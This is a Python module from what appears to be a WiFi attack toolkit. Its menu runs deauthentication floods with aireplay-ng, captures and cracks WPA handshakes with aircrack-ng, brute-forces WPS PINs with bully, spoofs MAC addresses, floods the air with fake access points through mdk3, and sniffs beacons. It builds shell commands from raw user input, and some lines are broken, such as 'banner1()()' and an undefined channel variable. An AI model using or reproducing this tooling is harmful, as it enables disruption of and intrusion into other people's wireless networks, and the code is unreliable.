import librerias

def wifi_module() :

        WH2 = input("\033[1;31mwifi>")

        if WH2 == "01" :
            os.system("clear")
            banner1()
            print(" \033[1;34mInterface => ")
            interfaz = input("\033[1;31mPRLS>")
            comando = "airmon-ng start {} && airmon-ng check kill".format(interfaz)
            os.system(comando)
            os.system("python3 main.py")

        elif WH2 == "02":
            os.system("clear")
            banner1()
            print(" \033[1;37mInterface--> ")
            interfaz = input("\033[1;31mPRLS>")
            comando = "airmon-ng stop {}".format(interfaz)  
            os.system(comando)
            os.system("python3 main.py")

        elif WH2 == "03":
            os.system("clear")
            print("\n\033[0m")
            os.system("sudo ifconfig")
            time.sleep(3)
            os.system("clear")
            os.system("python3 main.py")


        elif WH2 == "04":
            os.system("clear")
            banner1()()
            slowly(" \033[1;37mRestarting network...\033[0m")
            comando = "service networking restart && systemctl start NetworkManager"
            os.system(comando)
            print(" \033[1;31mProcess finished\033[0m")
            time.sleep(2)
            os.system("clear")
            os.system("python3 main.py")


        elif WH2 == "05":
            os.system("clear")
            banner1()
            print(" \033[0;37mInterface => ")
            interfaz = input("\033[1;31mPRLS>")
            comando = "airodump-ng {}".format(interfaz)
            print("\n \033[1;31m[WARNING] \033[0;37mWhen this finish press \033[1;37mCTRL + C\033[0m")
            time.sleep(3)
            os.system(comando)
            time.sleep(9)
            os.system("clear")
            os.system("python3 main.py")
        

        elif WH2 == "06":
            os.system("clear")
            banner1()
            print(" \033[1;37mInterface --> ")
            interfaz = input(" \033[1;32m>> \033[0;37m")
            comando = "airodump-ng {}".format(interfaz)
            print("\n \033[1;31m[WARNING] \033[0;37mWhen this finish press \033[1;37mCTRL + C\033[0m")
            time.sleep(2)
            os.system(comando)
            print("\n Insert BSSID")
            bssid = str(input(" \033[1;32m>> \033[0;37m"))
            print("\n Introduce \033[1;32mCH")
            channel = int(input(" \033[1;32m>> \033[0;37m"))
            print("\n Introduce \033[1;32mPath\033[0m were you want to save the handshake:")
            ruta = str(input(" \033[1;32m>> \033[0;37m"))
            print("\n Introduce number of packets (max 10000 | min 0):")
            paquetes = int(input(" \033[1;32m>> \033[0;37m"))
            comando = "airodump-ng -c {} --bssid {} -w {} {} | xterm -e aireplay-ng -0 {} -a {} {}".format(channel,bssid,ruta,interfaz,paquetes,bssid,interfaz)
            os.system(comando)
            time.sleep(2)
            os.system("clear")
            os.system("python3 main.py")


        elif WH2 == "07":
            os.system("clear")
            banner1()
            print(" \033[1;37mInsert handshake:\033[0m")
            ruta = str(input(" \033[1;32m>> \033[0;37m"))
            print("")
            print(" \033[1;37mInsert the diccionary:\033[0m")
            diccionario = str(input(" \033[1;32m>> \033[0;37m"))
            comando = "aircrack-ng {} -w {}".format(ruta,diccionario)
            os.system(comando)
            exit()

        elif WH2 == "08":
            os.system("clear")
            banner1()
            print(" \033[1;37mInsert interface:")
            interfaz = input(" \033[1;32m>> \033[0;37m")
            print(" \033[1;37mIntroduce the BSSID dof the AP:")
            bssid = input(" \033[1;32m>> \033[0;37m")
            print(" \033[1;37mIntroduce channel AP:")
            channel = input(" \033[1;32m>> \033[0;37m")
            print(" \033[1;37mIntroduce the ESSID of the AP:")
            essid = input(" \033[1;32m>> \033[0;37m")
            comando = "bully {} -b {} -c {} -e {} --force".format(interfaz, bssid, channel, essid)
            os.system(comando)

        elif WH2 == "09":
            os.system("clear")
            banner1()
            print(" \033[1;37mIsert interface =>")
            interface = input(" \033[1;32m>> \033[0;37m")
            nuevaMAC= input("Insert new MAC: \033[1;32m>> \033[0;37m")
            os.system(f"ifconfig {interface} down")
            print(f"Changin MAC interface {interface} a {nuevaMAC}")
            os.system(f"ifconfig {interface} hw ether {nuevaMAC}")
            print(f"New MAC is: {nuevaMAC}")
            os.system(f"ifconfig {interface} up")
            print("Interface is ready")
            time.sleep(1)
            os.system(f"ifconfig {interface}")
            time.sleep(4)
            os.system("clear")
            os.system("python3 main.py")
        

        elif WH2 == "10":
            os.system('clear')
            banner1()
            print(" \033[1;34mInsert interface =>")
            interface = input(" \033[1;32m>> \033[0;37m")
            print(" \033[1;34mIntroduzca el canal:")
            channel = input(" \033[1;32m>> \033[0;37m")
            print(" \033[1;34m¿Do you want to create a fake AP diccionary? [\033[1;32my\033[0m/\033[1;31mn\033[0m]\033[0m")
            crearDic = input(" \033[1;32m>> \033[0;37m")
            if crearDic == 'y':
                os.system('sudo bash AP_generator.sh')

            elif crearDic == 'n':
                pass    

            print("\n\033[1;37m Ingrese la ruta del diccionario\033[0m (default: \033[1;37m/wordlist/fakeAP.txt\033[0m): ")
            diccionario = str(input(" \033[1;32m>> \033[0;37m"))
            print("\n \033[1;31m[AVISO] \033[0;37mPresione \033[1;37m\033[1;37mCTRL + C \033[0;37mpara detener el ataque\033[0m")
            os.system("mdk3 {} b -f {} -a -s 1000 -c {}".format(interface,diccionario,channel))
            time.sleep(2) 
            
        elif WH2 == "11":
            
            access_points = pandas.DataFrame(columns=["BSSID", "SSID", "dBm_Signal", "Channel", "Security"])
            
            access_points.set_index("BSSID", inplace=True)

            def data_extraction(packet):
                
                if packet.haslayer(Dot11Beacon):
                       
                    bssid ="\033[1;32m ▏  " + packet[Dot11].addr2 + "  ▕"

                   
                    ssid = packet[Dot11Elt].info.decode()

                    try:
                        dBm_Signal = packet.dBm_AntSignal 
                    except:
                        dBm_Signal = "N/A" + "  ▕"
                    
                   
                    stats = packet[Dot11Beacon].network_stats() 
                    channel = stats.get("channel") 
                    security = stats.get("crypto") 
                    
                    access_points.loc[bssid] = (ssid, dBm_Signal, channel, security)

            def print_all():
                while True:
                    os.system("clear")
                    print("Listening on =>" + interface)
                    print("\033[1;34m—" * 80)
                    print(access_points)
                    print("\033[1;34m—" * 80)
                    time.sleep(0.5)
                
            def channel_change():
                channel = 1
                while True:
                    os.system(f"iwconfig {interface} channel {ch}")
                    ch = ch % 14 + 1
                    time.sleep(0.5)
      
            if __name__ == "__main__":

                os.system("iwconfig")
                a = input("Interface =>")
                interface = a                

                printer = Thread(target=print_all)
                printer.daemon = True
                printer.start()
                
                channel_changer = Thread(target=channel_change)
                channel_changer.daemon = True
                channel_changer.start()

                sniff(prn=data_extraction, iface=interface)
    
wifi_module()
